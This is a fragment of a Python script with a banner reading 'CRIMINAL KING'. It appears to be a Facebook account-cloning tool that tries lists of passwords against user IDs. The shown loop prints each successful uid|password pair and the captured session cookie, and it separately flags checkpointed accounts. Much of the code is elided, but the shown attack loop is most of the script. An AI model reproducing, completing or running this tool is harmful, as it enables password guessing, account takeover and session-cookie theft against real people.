...
logo = ("""
\x1b[1;93m   
 _____ ______ ________  ________ _   _   ___   _       _   _______ _   _ _____ 
/  __ \| ___ \_   _|  \/  |_   _| \ | | / _ \ | |     | | / /_   _| \ | |  __ \
| /  \/| |_/ / | | | .  . | | | |  \| |/ /_\ \| |     | |/ /  | | |  \| | |  \/
| |    |    /  | | | |\/| | | | | . ` ||  _  || |     |    \  | | | . ` | | __ 
| \__/\| |\ \ _| |_| |  | |_| |_| |\  || | | || |____ | |\  \_| |_| |\  | |_\ \
 \____/\_| \_|\___/\_|  |_/\___/\_| \_/\_| |_/\_____/ \_| \_/\___/\_| \_/\____/
                                                                               
                                                                               
                                        
[+]==============================================
[+] CREATED BY   :  ANONYMOUS MONIR
[+] COUNTRY      :  BANGLADESH 
[+] ON GITHUB    :  MONIR-IN
[+] TOOL STATUS  :  RANDOM
[+] TOOL VERSION :  7.0
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[MONIR-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[MONIR-CP❌] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[MONIR💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()